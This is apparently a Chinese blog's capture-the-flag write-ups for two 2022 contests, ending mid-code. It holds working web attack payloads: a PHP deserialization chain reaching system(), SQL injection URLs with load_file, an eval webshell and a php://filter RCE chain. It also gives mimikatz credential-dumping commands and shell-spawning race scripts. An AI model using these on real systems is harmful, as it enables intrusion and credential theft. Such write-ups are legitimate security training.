web-3-web82 ##\n\n```php\n<?php\nhighlight_file(__FILE__);\nini_set(\"display_error\", false);\nerror_reporting(0);\n$str = isset($_GET['A_A'])?$_GET['A_A']:'A_A';\nif (strpos($_SERVER['QUERY_STRING'], \"A_A\") !==false) {\n    echo 'A_A,have fun';\n}\nelseif ($str<9999999999) {\n    echo 'A_A,too small';\n}\nelseif ((string)$str>0) {\n    echo 'A_A,too big';\n}\nelse{\n    echo file_get_contents('flag.php');\n\n}\n\n?>\n```\n\n需要我们传入`A_A`，但是又不能等于`A_A`，看似很矛盾，实际上利用了php的一个小特性\n\n在php中，变量名中的`+` `%20` `.` `空格` `[`会被替换成下划线，所以当我们传入`A.A`或`A A`时，也会被当成`A_A`\n\n\n然后就是绕过数字，因为在php中会认为数组比数字大，所以传入`?A+A[]=`即可\n\n\n## vipzone ##\n\n首页有个hint，`guest:guest 账户已经启用`，那就用guest账号登录看一下\n\n发现有两个cookie比较可疑，因为有一个非常明显是base64加密后的值\n\n![](/img/wp/2022/2022qianxin-3.png)\n\n\nbase64解密后发现是明文的序列化对象\n\n![](/img/wp/2022/2022qianxin-4.png)\n\n而第二个cookie: `check`恰恰用这串base64的md5值的base64值来校验\n\n所以我们只需要修改序列化对象然后加密就可以绕过登录了\n\n但是我们不知道admin的密码，这里可以尝试用布尔型代替密码，并赋值为1\n\n修改后的值：`O:4:\"User\":2:{s:4:\"user\";s:5:\"admin\";s:4:\"pass\";b:1;}`\nbase64加密：`Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30=`\nmd5加密：`6897f0060a84ecb0600e4167d2a748e4`\n\n\n![](/img/wp/2022/2022qianxin-5.png)\n\n\n## web-3-web54 ##\n\n```php\n<?php\nerror_reporting(0);\ninclude \"flag1.php\";\nhighlight_file(__file__);\nif(isset($_GET['args'])){\n    $args = $_GET['args'];\n    if(!preg_match(\"/^\\w+$/\",$args)){\n        die(\"args error!\");\n    }\n    eval(\"var_dump($$args);\");\n}\n```\n\n有一个正则匹配`/^\\w+$/`\n\n{% note info %}\n两个//表示开始和结束\n^表示开始字符串\n$表示结束字符串\n\\w表示包含[a-z，A-Z, _ , 0-9]\n+表示一个或者多个\\w\n{% endnote %}\n\n\n然后是一个`$$args`，也就是说我们传入的参数将会被当作一个变量名并打印它的变量值\n\n传入php超全局变量`$GLOBALS`即可\n\n![](/img/wp/2022/2022qianxin-6.png)\n\n\n## Web-4-littledropbox ##\n\n```php\n<?php\nfunction upload()\n{\n    $uploadDir = \"uploads/\" . md5($_SERVER['REMOTE_ADDR']);\n    echo md5($_SERVER['REMOTE_ADDR']);\n    if (!is_dir($uploadDir)) mkdir($uploadDir);\n    if (!empty($_FILES[\"file\"])) {\n        if (preg_match(\"/ph/i\", substr($_FILES[\"file\"][\"name\"], strrpos($_FILES[\"file\"][\"name\"], \".\") + 1))) die(\"nonono!!!\");\n        if (mb_strpos(file_get_contents($_FILES[\"file\"][\"tmp_name\"]), '<?') !== False) die(\"nonono!!!\");\n        $info = getimagesize($_FILES[\"file\"][\"tmp_name\"]);\n        if ($info[0] !== 100 || $info[1] !== 50) {\n            die(\"nonono!!!\");\n        }\n    }\n    @move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $uploadDir . \"/\" . basename($_FILES[\"file\"][\"name\"]));\n}\n\n$ready = filter_input(INPUT_GET, 'ready');\n$key = filter_input(INPUT_GET, 'key');\nif ($ready === \"1\") {\n    session_start();\n    if (!isset($_SESSION[\"secretKey\"])) {\n        $_SESSION[\"secretKey\"] = mt_rand();\n    }\n    mt_srand($_SESSION[\"secretKey\"]);\n    echo mt_rand() . \"<br>\";\n    for ($i = 0; $i < 225; $i++) mt_rand();\n    echo mt_rand() . \"<br>\";\n    echo mt_rand() . \"<br>\";\n    echo mt_rand() . \"<br>\";\n    if ($key === (string)$_SESSION['secretKey']) {\n        upload();\n    }\n} else {\n    highlight_file(__FILE__);\n}\n```\n\n\n# pwn #\n\n## race ##\n\nida分析：\n1：当i大于9，且输入不为1时，会调用`system(\"/bin/sh\")`；\n2：修改i的值需要调用thread1函数，在这里因为`count = 3` ，而每次执行`thread1`函数，都会使`count--`,\n在正常的使用中，最多只能执行三次`i++`，不过因为`sleep(0xA)`的原因，线程会在验证`count`的值之后停下，我们可以在这10秒中，调用多次`thread1`函数，使多个线程卡在`++i`指令之前，在10秒之后，就会执行多次`++i`指令，使`i>9`，这时输入一个非1的数字，程序就会调用`system(\"/bin/sh\")`\n\n\n![](/img/wp/2022/2022qianxin-7.png)\n\n\n```python\nimport time\nfrom pwn import *\np=remote('172.19.1.28','10001')\nfor i in range(10):\n    p.sendline('1')\ntime.sleep(0xb)\np.sendline('2')\np.interactive()\n```\n\n![](/img/wp/2022/2022qianxin-8.png)\n\n\n## race2 ##\n\n在`file_read`函数中，当`buf`字符串中不存在`flag`时，会先等待`5`秒\n然后打开`buf`字符串指定的文件，并输出文件内容\n\n![](/img/wp/2022/2022qianxin-9.png)\n\n\n但因为程序是使用多线程调用的`file_read`函数，所以程序在等待`5`秒时，我们还是可以修改`buf`字符串的值\n\n最后只需要先让线程执行到`sleep(5);`代码处，然后再输入`flag`，然后等待一段时间，程序就会打开靶机上的`flag`文件，并输出其内容\n\n![](/img/wp/2022/2022qianxin-10.png)\n\n```python\nfrom pwn import *\nimport time\np=remote('172.19.1.132',10002)\np.sendline('1')\np.sendline('abc')\ntime.sleep(1)\np.sendline('1')\np.sendline('flag')\ntime.sleep(5)\np.interactive()\n```\n\n![](/img/wp/2022/2022qianxin-11.png)\n\n\n# misc #\n\n## misc-3-hacker ##\n\n下载得到一个`lsass.dmp`文件，什么是`lsass.dmp`呢，它是`procdump`从`lsass.exe`中导出的凭据，可以用`mimikatz`读取\n\n\n把文件放到程序目录下，以管理员运行`mimikatz`，执行以下命令\n\n{% note info %}\nprivilege::debug\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords full\n{% endnote %}\n\n\n![](/img/wp/2022/2022qianxin-12.png)\n\n如果报错`ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos->ProcessorArchitecture (0) != PROCESSOR_ARCHITECTURE_AMD64 (9)`\n\n那么可能是架构错了，用win32版本重新运行即可\n\n\n## misc-3-funny ASCII ##\n\n二进制数据转成文本即可\n\n![](/img/wp/2022/2022qianxin-13.png)\n\n\n## misc-4-password ##\n\n打开一看，发现有几个文件很小，只有4\n\n![](/img/wp/2022/2022qianxin-14.png)\n\n一般小于6的文件是可以进行crc爆破的，推荐[工具](https://github.com/theonlypwner/crc32)\n\n用法：`python crc32.py reverse crc`\n\n![](/img/wp/2022/2022qianxin-15.png)\n\n\n提取出来后转字符串得到`easypassword`，解压得到flag\n\n\n## misc103 ##\n\n根据题目描述来看是一道数据恢复题\n\nfile命令看下文件`badimages: Linux rev 1.0 ext3 filesystem data, UUID=ca014691-c6ea-4a5a-8da4-74a1aa1c9a80`\n\n\n可以知道是linux下的ext3文件，linux下的文件恢复可以用`extundelete`命令\n\n看日志：`extundelete <file> --journal`\n\n![](/img/wp/2022/2022qianxin-16.png)\n\n\n尝试恢复所有目录和文件：`extundelete <file> --restore-all`\n\n![](/img/wp/2022/2022qianxin-17.png)\n\n\n恢复到`RECOVERED_FILES`目录\n\nflag在`RECOVERED_FILES/Flag.txt`中\n\n\n## Misc-5-Forgotten password ##\n\n取证题\n\n第一步肯定是获取内存镜像的基本信息\n\n![](/img/wp/2022/2022qianxin-18.png)\n\n根据hint`小明总是喜欢password记录下来`，用`editbox`显示出有关编辑控件的信息，得到密码`password*&!@wxcq12`\n\n![](/img/wp/2022/2022qianxin-19.png)\n\n\n用密码直接交不对，那么应该是压缩包之类的密码了\n查找压缩包并导出\n\n![](/img/wp/2022/2022qianxin-20.png)\n\n\n用`editbox`得到的密码解压压缩包拿到flag\n\n# crypto #\n\n## Write a script ##\n\nmd5爆破\n\n```python\nimport hashlib\nimport itertools\nword=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\nr=itertools.product(word,repeat=3)\nfor i in r:\n\n    dec =\"flag{P7%sY0OG%s0XPC%sZPK}\"%(i[0],i[1],i[2])\n    dec=dec.strip()\n    enc = hashlib.md5()\n    enc.update(dec.encode())\n    code=enc.hexdigest()\n    code=code.strip()\n    if code[:4]==\"9e86\" and code[-6:]==\"0ea7cf\":\n        print(dec)\n```\n\n![](/img/wp/2022/2022qianxin-21.png)\n\n\n## base ##\n\n给了一个py文件和明文的md5值\n\n代码中明文base64加密之后将小写字母全部变为大写\n\n\n使用脚本暴力破解\n```python\n# -*-coding: utf-8 -*-\n\nimport hashlib\nimport itertools\nimport base64\n\ndef check(str):\n    m1 = hashlib.md5(str).hexdigest()\n    if m1 == '16478a151bdd41335dcd69b270f6b985':\n        return True\n    else:\n        return False\n\nlist1=itertools.product(['Y','y'],['M','m'],['F','f'],['Z','z'],['Z','z'],['T','t'],['Y','y'],['0'],['D','d'],['3'],['R','r'],['M','m'],['D','d'],['3'],['R','r'],['M','m'],['M','m'],['T','t'],['I','i'],['Z','z'])\nfor i in list1:\n    str1=''.join(i)\n    if check(base64.b64decode(str1)):\n        print \"The Flag is \"+base64.b64decode(str1)\n        break\n    else:\n        print \"not \"+str1\n```\n\n\n\n# reverse #\n\n## 一张来自夏天的车票 ##\n\npyc文件，先进行反编译\n\n`uncompyle6 exp.pyc > exp.py`失败，修复下文件\n\nfile看下版本，是3.6的\n\n![](/img/wp/2022/2022qianxin-22.png)\n\n\n构造一个3.6生成的pyc文件与`exp.pyc`对比\n\n会发现中间少了四个字节\n\n![](/img/wp/2022/2022qianxin-23.png)\n\n填充上`00`\n\n![](/img/wp/2022/2022qianxin-24.png)\n\n\n反编译后运行得到flag\n\n```python\n# uncompyle6 version 3.8.0\n# Python bytecode 3.6 (3379)\n# Decompiled from: Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)]\n# Embedded file name: exp.py\n# Compiled at: 2021-06-10 15:30:34\nimport base64\nkey = 'e4b5e6d3-bc5a-475b-8c26-d3941ed9b90f'\nenc = 'XQdSA1YEV1IAAFMGUwAAA1AGAFkFBwcAAQQPVwRVXAxXDFFf'\nprint(key[(len(key) - 1)])\n\ndef decode2(m):\n    return base64.urlsafe_b64decode(m)\n\n\ndef decode1(m, key):\n    flag = ''\n    for i in range(len(key) - 6):\n        flag += chr(ord(key[i]) ^ ord(chr(m[i])))\n\n    return flag\n\n\nprint(decode2(enc))\ntmp = decode1(decode2(enc), key)\nprint(tmp)\n# okay decompiling exp.pyc\n```\n\n## 啊？ ##\n\n安卓逆向题，先在模拟器上安装，找到验证函数\n\n![](/img/wp/2022/2022qianxin-25.png)\n\n跳转到`check`方法\n\n\n```java\npublic class M extends T {\n    public void check(String str) {\n        String key;\n        if (str.length() != 16) {\n            throw new RuntimeException();\n        }\n        try {\n            key = m0getey();\n        } catch (Exception e) {\n            key = getKey();\n            System.arraycopy(key, 0, str, 5, 5);\n        }\n        int[] iArr = new int[16];\n        iArr[0] = 42;\n        iArr[12] = 14;\n        iArr[10] = 7;\n        iArr[14] = 15;\n        iArr[15] = 17;\n        try {\n            iArr[1] = 43;\n            iArr[5] = 5;\n            System.out.println();\n        } catch (Exception e2) {\n            iArr[5] = 37;\n            iArr[1] = 85;\n        }\n        iArr[6] = 15;\n        iArr[2] = 32;\n        iArr[3] = 23;\n        iArr[11] = 68;\n        iArr[4] = 85;\n        iArr[13] = 5;\n        iArr[9] = 7;\n        iArr[7] = 8;\n        iArr[8] = 22;\n        for (int i = 0; i < str.length(); i++) {\n            if ((iArr[i] & 255) != ((str.charAt(i) ^ key.charAt(i % key.length())) & 255)) {\n                throw new RuntimeException();\n            }\n        }\n    }\n```\n\n本题的关键就是最后那个if判断，会将输入的字符串与key进行异或，值存储在`iArr`数组里\n\n从上面贴出代码的第八行跳转到`m0getey`函数获取key\n\n![](/img/wp/2022/2022qianxin-26.png)\n\n\n解密脚本\n将数组中的值和key逐个异或即可得到flag\n\n```python\nv1 = [42, 43, 32, 23, 85, 5, 15, 8, 22, 7, 7, 68, 14, 5, 15, 17]\nkey = \"anylab\"\nfor x in range(16):\n    print(chr((v1[x] & 255) ^ (ord(key[x % 6]) & 255)), end=\"\")\n```","tags":["wp","2022竞赛","奇安信"],"categories":["wp"]},{"title":"2022强国杯技术技能大赛初赛wp","url":"/posts/fc877f48/","content":"\nRank: 10，（东部赛区太卷了吧）\n\n![](/img/wp/2022/2022qgb-1.png)\n\n\n# web #\n\n## upload_lol ##\n\n先传.htaccess，再传图片马，getshell\n\n![](/img/wp/2022/2022qgb-2.png)\n\n有个内容检测，php版本为5，用script标签绕过即可\n![](/img/wp/2022/2022qgb-3.png)\n\n![](/img/wp/2022/2022qgb-4.png)\n\n\n\n## ezpop_new ##\n源码\n```php\n<?php\nfunction filter($string) {\n    $safe = array('system','fopen','fread','file_get_contents','flag');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'nonono', $string);\n}\n\nclass PingUtils{\n    function __call($name,$args){\n        system(\"ping -c4 ${args[0]}\");\n    }\n}\nclass Cindy{\n    var $someone;\n    var $phone;\n    function call(){\n        $this->phone->call($this->someone);\n    }\n}\nclass Bob{\n    public $flag=True;\n    public function __get($a){\n        if($this->flag){\n            $cindy = new Cindy();\n            $cindy->someone =  $_REQUEST['someone'];\n            $cindy->phone = \"p50\";\n            #var_dump(filter(serialize($cindy)));\n            $cindy = unserialize(filter(serialize($cindy)));\n            $cindy->call($someone);\n        }else{\n            echo 'nonono';\n        }\n    }\n    public function __wakeup(){\n        $this->flag = False;\n    }\n}\nclass Alice{\n        public function __destruct(){\n        echo $this->c->b;\n    }\n}\nhighlight_file(__FILE__);\n@unserialize($_GET['pop']);\n```\n\n从入口先到`__destruct()`，往下走只能是echo触发`__toString`或者`$this->c->b`，对于`$this->c`触发`__get`，这里显然只有`__get`能用\n\n![](/img/wp/2022/2022qgb-5.png)\n\n但是进入`__get`中利用的部分需要条件`if($this->flag)`，显然\n\n```php\npublic function __wakeup(){\n        $this->flag = False;\n    }\n```\n会阻碍这个条件成立\n\n由于题目中的PHP版本合适,可以采用修改超过成员数目来绕过`wakeup`\n\npayload:`?pop=O:5:\"Alice\":1:{s:1:\"c\";O:3:\"Bob\":2:{s:4:\"flag\";b:1;}}`\n\n进入下一个利用部分，考察反序列化字符串替换溢出\n\n利用点在\n```php\nclass PingUtils{\n    function __call($name,$args){\n        system(\"ping -c4 ${args[0]}\");\n    }\n}\n```\n而此又需要从\n```php\nclass Cindy{\n    var $someone;\n    var $phone;\n    function call(){\n        $this->phone->call($this->someone);\n    }\n}\n```\n触发\n\n\n但是此处的赋值是无法实现这个功能的\n```php\n$cindy = new Cindy();\n$cindy->someone =  $_REQUEST['someone'];\n$cindy->phone = \"p50\";\n```\n\n\n利用点在\n```php\n$cindy = unserialize(filter(serialize($cindy)));\n```\n其中的filter会对反序列化后的字符串进行特定值替换,然后再解压\n\n\n{% note info %}\n所以可以通过赋值特定字符串触发filter中的过滤实现溢出,从而达到后面自PingUtils类到filter这条链的利用\n\n\n因为序列化后的字符串中是依靠特定位置的数字来标示其后的属性内容的长度,这个非等长替换就会导致在反序列化解析时出现整体的偏移,原本的作为结构的部分被偏移到属性内容的部分,属性内容的部分值又会偏移视为结构的部分\n\n构造足够多的非等长替换,就能偏移出一个完整结构部分,在里面定义出需要的属性\n\n一个序列化后的字符串如果存在多余无法正常解析的部分,这部分前面如果能被正常解析,那么多余部分在解析时会被抛弃掉，所以构造产生多余数据不用担心，会被忽略掉\n{% endnote %}\n\n\n\n构造出payload:\n`someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|ls  /\";s:5:\"phone\";O:9:\"PingUtils\":0:{}}`\n\n\n{% note info %}\n\n对于payload来说，在`filter`替换前`$cindy->someone`属性的值序列化字符串表示是 `s:5:\"cindy\";s:224:\"PAYLOADSTRING....\"`这样\n\n\n但是`filter`替换会把`fread`换成`nonono`即长度`5`的字符串变成长度`6`\n\n\n但此时`$cindy->someone`属性用来表示其值 这一字符串的长度的数字还是`224`没变\n\n\n但实际上替换后值字符串的总长度由`224`变成了`224+35`(有35个fread替换为了nonono)\n\n\n所以反序列化只会取值字符串前`224`个字符作为`$cindy->someone`属性反序列化后的值\n\n\n剩下`35`则会被当成反序列化字符串中的结构部分杯解析\n\n\n即在PHP看来整个字符串是这样的`\"cindy\";s:224:\"AfterPayloadString...\";s:5:\"phone\";O:9:\"PingUtils\":0:{}}`\n\n\n在`cindy`属性后面还有一个属性`phone`,其值是个名为`PingUtils`的对象\n\n\n注意最末尾的`}`.这个将于整个反序列化字符串开始的`{`闭合,PHP将把这个看作反序列化字符串的结尾\n\n\n只有后面的内容由于结构不完整PHP并不会解析,而是直接抛弃并且不会产生任何报错\n{% endnote %}\n\n\n读取flag：\n`?pop=O:5:\"Alice\":1:{s:1:\"c\";O:3:\"Bob\":2:{s:4:\"flag\";b:1;}}&someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|nl /*\";s:5:\"phone\";O:9:\"PingUtils\":0:{}}`\n\n\n\n## file_sql_new ##\n\n*赛后复现*\n\nsql注入，过滤了一次select\n\n双写select绕过\n\n\npayload：\n\n`http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),3%23`\n\n![](/img/wp/2022/2022qgb-6.png)\n\n`http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(selselectect(group_concat(column_name))from(information_schema.columns)where((table_name)=(%27fl4g%27))),3%23`\n\n\n![](/img/wp/2022/2022qgb-7.png)\n\n`http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(fllllag)from(fl4g)),3%23`\n\n\n![](/img/wp/2022/2022qgb-8.png)\n\n`http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seleselectct(hex(load_file(%22/var/www/html/flag.php%22)))),3%23`\n\n![](/img/wp/2022/2022qgb-9.png)\n\n\n得到`3C3F7068700A0A24666C6167203D207B6C69726768793864757370717A6A6631623735636E6561773330343974766D787D3B0A6563686F20226161223B0A3F3E0A`，转字符串即可得到flag\n\n\n\n## ezweb_new ##\n\n*赛后复现*\n\n```php\n<?php\n    highlight_file(__FILE__);\n    $_=@$_GET['‮imaohw?⁦⁩⁦whoami'];//\n    $__=\"/var/www/html\";\n    if($_ && @substr(file($_)[0],0,6) === '@<?php'){\n        include($_);\n    }\n    foreach ($_GET as $key => $value) {\n        $$key = $value;\n    }\n    var_dump(scandir($__));\n```\n\n\n上来有个小陷阱，在传参的地方，用鼠标选，会发现注释处左右的字符串不受你控制，这里考的就是`unicode`字符串了\n\n当复制代码进某些编辑器中可以看到识别到了一些`Unicode`字符串,参数很明显不是`whoami`了\n![](/img/wp/2022/2022qgb-10.png)\n\n\n将`[U+202E]`等进行Url编码，得到`%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami`\n\n\n继续往下看，可以有两种方法做\n\n方法一：\nPHP崩溃getshell\n\n使php崩溃后保留下临时文件，然后利用`scandir`查文件名，最后包含达到getshell\n\n写马：\n```python\nimport requests\n\nurl = \"http://82.157.177.192:46728/?%E2%80%AEimaohw%3F%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/string.strip_tags/resource=/etc/passwd\"\nparamsMultipart = [('file', ('a.php', \"@<?php\\r\\neval(\\x24_POST['a']);\\r\\necho 123;\\r\\n?>\", 'application/octet-stream'))]\n\nrequests.post(url,files=paramsMultipart)\n```\n\n查文件名：\n`http://82.157.177.192:46728/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=1&__=/tmp/`\n\n![](/img/wp/2022/2022qgb-11.png)\n\n\ngetshell：\n`http://82.157.177.192:46728/??%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=/tmp/phpsxtpjV`\n\n![](/img/wp/2022/2022qgb-12.png)\n\n\n\n方法二：\nfilter构造一句话rce\n\n[原理参考1](https://blog.csdn.net/rfrder/article/details/122326155)\n[原理参考2](https://tttang.com/archive/1395/)\n\n[项目地址](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)\n\n\n师傅们如果生成出来的payload不能用的话可以试试切换系统，比如用ubuntu或者kali或者debian试试（不要用windows，因为在windows下文件名不区分大小写），还有php版本尽量跟题目保持一致，否则服务器上的iconv默认支持和靶机不一样，就会无效。要是还不行就试试项目中的fuzzer.php，重新构造下(我构造这个花了一天的时间，呜呜呜)\n\n\n我的poc\n\n```python\nfile_to_use = \"/etc/passwd\"\n\n#@<?php eval($_POST[2]);;?>\nbase64_payload = \"QDw/cGhwIGV2YWwoJF9QT1NUWzJdKTs7Pz4K\"\n\n# generate some garbage base64\nfilters = \"convert.iconv.UTF8.CSISO2022KR|\"\nfilters += \"convert.base64-encode|\"\n# make sure to get rid of any equal signs in both the string we just generated and the rest of the file\nfilters += \"convert.iconv.UTF8.UTF7|\"\n\n\nfor c in base64_payload[::-1]:\n        if(c==\"/\"):\n            c=\"%2f\"\n        filters += open('./res/'+c).read() + \"|\"\n        # decode and reencode to get rid of everything that isn't valid base64\n        filters += \"convert.base64-decode|\"\n        filters += \"convert.base64-encode|\"\n        # get rid of equal signs\n        filters += \"convert.iconv.UTF8.UTF7|\"\n\nfilters += \"convert.base64-decode\"\n\nfinal_payload = f\"php://filter/{filters}/resource={file_to_use}\"\n\nwith open('test.php','w') as f:\n    f.write('<?php echo file_get_contents(\"'+final_payload+'\");?>')\nprint(final_payload)\n```\n\n\n\n{% note info %}\nhttp://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd\n\nPOST\n2=system('ls');\n{% endnote %}\n\n\n用上面两种方法都能getshell，但是会发现读不了flag，没权限\n\n用`ps -aux`命令看下进程，发现root用户开了个`tomcat`服务\n\n![](/img/wp/2022/2022qgb-13.png)\n\n\ncurl试一下tomcat的默认8080端口，有内容\n\n![](/img/wp/2022/2022qgb-14.png)\n\n\n但是命令行不好做题，就先考虑代理出来\n\nweb根目录下传个`proxy.php`，注意修改下地址\n\n[项目地址](https://blog.csdn.net/weixin_44599931/article/details/124981841)\n\n```php\n<?php\n \n/*\n *\n    PHP接口代理转发：\n    以Golang接口转发为例；\n    如有必要，请设置内网IP为白名单；\n    建议内网接口返回格式：Content-Type: text/html; charset=UTF-8；\n *\n    使用示例：\n    $host = \"http://127.0.0.2\"; // 外网网址（主网址或有部分路径）\n    $intranet = 'http://127.0.0.4'; // 内网网址（主网址或有部分路径）\n    $php_proxy = new php_proxy();\n    $back = $php_proxy->request_intranet($host, $intranet);\n    echo $back;\n * */\nclass php_proxy{\n \n    // 发送get、post请求\n    public function request_option($request_url='', $method='post', $request_data=[], $to_json=false): string{\n        if (empty($request_url)) {\n            $back = 